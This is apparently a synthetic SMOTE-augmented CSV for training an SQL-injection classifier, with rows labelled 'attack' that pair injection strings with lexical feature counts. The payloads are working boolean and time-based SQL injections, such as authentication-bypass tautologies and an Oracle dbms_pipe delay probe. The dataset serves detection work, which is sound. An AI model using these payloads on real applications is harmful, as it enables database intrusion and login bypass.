id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000012,attack,boolean,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao",nearest_attack_euclidean,R000300,0.34808435403895327,124.99848668438196,29.58303907751872,4.081295966199856,70.16607815503744,8.666330374307108,32.916204264672274,13.249873890365166,0.5622206865372593,0.0685466078123268,0.2631160690179391,0.10611663663247481,0.0,0.08329129678838831,2.0,0.0,1.0,1.0832912967883883,0.0,4.0832912967883885,0.0,0.0,2.0,4.0832912967883885,0.0,0.08329129678838826,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.08329129678838837,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0832912967883885
SMOTE_000013,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000307,0.6598514709488887,141.97631402164046,31.650876014426977,3.9200748643335226,48.952628043280924,15.023685978359538,52.16271900360674,25.837280996393257,0.34440265330658115,0.10607992949305001,0.36745187679757063,0.18206554040279813,3.8372809963932566,0.0,0.0,0.0,0.0,1.8372809963932564,0.0,10.162719003606743,0.0,2.0,1.0,7.837280996393256,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.1627190036067438,0.0,0.0,0.16271900360674357,1.0,0.8372809963932564,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1627190036067434
SMOTE_000014,attack,boolean,admin'  )   or '1'  =  '1'#,nearest_attack_euclidean,R000089,0.19532721392818309,26.620339475171594,12.92406789503432,3.029240924325699,7.0,2.0,9.696271580137276,7.9240678950343195,0.26373337318821355,0.07535239233948957,0.3629561244309604,0.29795811004133643,5.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9240678950343191,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.9240678950343191,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000015,attack,boolean," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000132,0.2506855111443589,64.24306064025359,22.0,3.526881145671245,26.0,4.873843440042266,23.495373760169063,9.873843440042265,0.40513179226946716,0.07577171327287596,0.3654148211329603,0.15368167332469657,0.0,2.0,2.0,0.0,1.0,2.873843440042265,1.0,0.0,0.0,0.0,0.8738434400422654,5.873843440042266,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000016,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000156,0.04889886509826311,32.852994182336616,13.970598836467323,2.959285190437294,7.0,2.0,13.882395345869293,9.970598836467323,0.21347699700084805,0.06099342771452802,0.4218407481699263,0.3036888271146977,5.0,0.0,2.0,0.0,0.0,1.0,0.0,1.9705988364673233,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.9852994182336616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000017,attack,boolean,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000050,0.3151418676768615,53.967418585521855,20.311612390347904,3.502473180370146,24.0,4.655806195173952,19.0,6.311612390347904,0.44502865522639,0.08609519154089444,0.35231435205422545,0.1165618011784901,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.655806195173952,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,boolean,"or 0  =  0 #""",nearest_attack_euclidean,R000037,1.1316921588369635,12.542154717649083,6.54215471764908,2.249273711665592,2.0,2.0,6.0,2.5421547176490797,0.15971596515834513,0.15971596515834513,0.4791478954750354,0.20142017420827438,0.0,0.5421547176490802,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5421547176490801,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000019,attack,boolean, or 'x'  =  'x,nearest_attack_euclidean,R000232,0.3061162179511649,13.555488094865737,6.0,2.2484763635491243,4.0,0.0,5.555488094865741,4.0,0.2954837781348189,0.0,0.4090324437303622,0.2954837781348189,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000020,attack,boolean,admin'or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000175,0.9531087099050324,27.073076220327906,11.308974593224033,2.888673253993221,8.382050813551936,2.0,10.691025406775967,6.0,0.30862819542357584,0.07407692508477742,0.39506410423731453,0.22223077525433224,4.0,0.0,0.0,0.0,0.0,1.691025406775968,0.0,0.3089745932240322,0.0,0.0,0.0,1.6910254067759678,1.0,0.0,0.0,0.0,0.0,1.0,0.308974593224032,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.691025406775968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6910254067759678
SMOTE_000021,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000014,0.31819016425094293,59.0,22.0,3.616307921132143,26.0,4.33930229966135,20.0,8.66069770033865,0.4406779661016949,0.07354749660442966,0.3389830508474576,0.14679148644641782,0.0,1.6606977003386498,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000022,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000071,2.135977757497366,37.47879190954563,19.60875465661618,3.7969862461795154,22.0,0.6087546566161812,10.478791909545631,4.391245343383819,0.5956300137118873,0.014847674551614176,0.26899952862632015,0.12052278311017839,0.39124534338381894,0.0,2.0,0.0,0.0,0.0,0.0,1.2175093132323622,0.0,0.0,0.3912453433838189,2.0,0.3912453433838189,0.0,1.0,0.0,0.0,0.0,0.6087546566161811,0.0,0.0,0.0,0.0,0.608754656616181,0.0,0.0,0.6087546566161812,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2175093132323624
SMOTE_000023,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000024,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000308,1.4106225500050764,155.18961275224632,34.70289819334447,4.144944157102051,83.43236726888517,14.270530924459285,41.91908182778705,15.56763273111482,0.5384799725031607,0.09130118210513424,0.2699721335854981,0.10024671180620691,0.2161836344425896,0.7838163655574105,1.567632731114821,0.0,1.0,1.7838163655574104,0.0,5.000000000000001,0.0,0.0,2.0,4.351449096672232,0.21618363444258948,0.7838163655574104,0.7838163655574105,0.2161836344425895,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7838163655574105,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7838163655574104
SMOTE_000025,attack,boolean," select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000264,0.11757449101695558,64.58799067245516,21.06866822125747,3.464507120700816,26.0,5.862663557485055,23.72532711497011,9.0,0.4027932835765752,0.09062455989616626,0.36715371221229026,0.13942844431496831,0.0,2.0,2.0,0.0,1.0,2.9313317787425275,1.0,0.0,0.0,0.0,0.0,5.9313317787425275,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000026,attack,boolean,or 1  =  1/*,nearest_attack_euclidean,R000018,1.8031258042949472,15.34367334506419,9.86600572434073,2.869040330178426,4.388338103617276,2.0,5.477667620723455,3.477667620723455,0.26303820418104795,0.13733619872750713,0.368480897909476,0.2311446991819689,0.4776676207234552,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.47766762072345514,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000027,attack,boolean," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",nearest_attack_euclidean,R000095,0.17077962995162738,59.0,21.638115163301222,3.603424540809627,26.0,4.361884836698777,20.0,8.638115163301222,0.4406779661016949,0.0739302514694708,0.3389830508474576,0.14640873158137668,0.0,2.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000028,attack,boolean,0 or 1  =  1,nearest_attack_euclidean,R000104,0.3093189037212138,11.579551750513275,6.053034500342184,2.1676588722885874,2.0,3.053034500342185,5.526517250171093,1.0,0.1756992038382573,0.256701857710733,0.47974933653188107,0.08784960191912865,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000029,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,0.5599009027424208,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.48662538795842514,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000030,attack,boolean,"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",nearest_attack_euclidean,R000281,1.4469458287548984,70.02799015052994,27.243002462367514,3.8123186314157427,13.944019698940092,16.0,26.055980301059908,14.027990150529954,0.2004812942649542,0.22862143317038486,0.3710722886610079,0.19982498390365303,4.0,0.0,1.0,0.0,0.0,2.0,0.0,3.513995075264977,1.513995075264977,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000072,0.40247866156106676,25.162396834932977,9.434583641517838,2.383007767712009,5.717291820758918,0.0,12.86916728303568,6.57593773113838,0.2311970850552724,0.0,0.5058041295050307,0.2629987854396968,3.85864591037946,0.0,0.0,0.0,0.0,1.0,0.0,1.7172918207589196,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.8586459103794597,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000032,attack,boolean,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,nearest_attack_euclidean,R000124,0.16377550750307465,54.67423058852932,21.325769411470677,3.6705680406018057,24.0,4.0,17.67423058852932,9.0,0.4389961164563287,0.07316601940938812,0.3232143204631599,0.16462354367112328,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,6.674230588529321,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
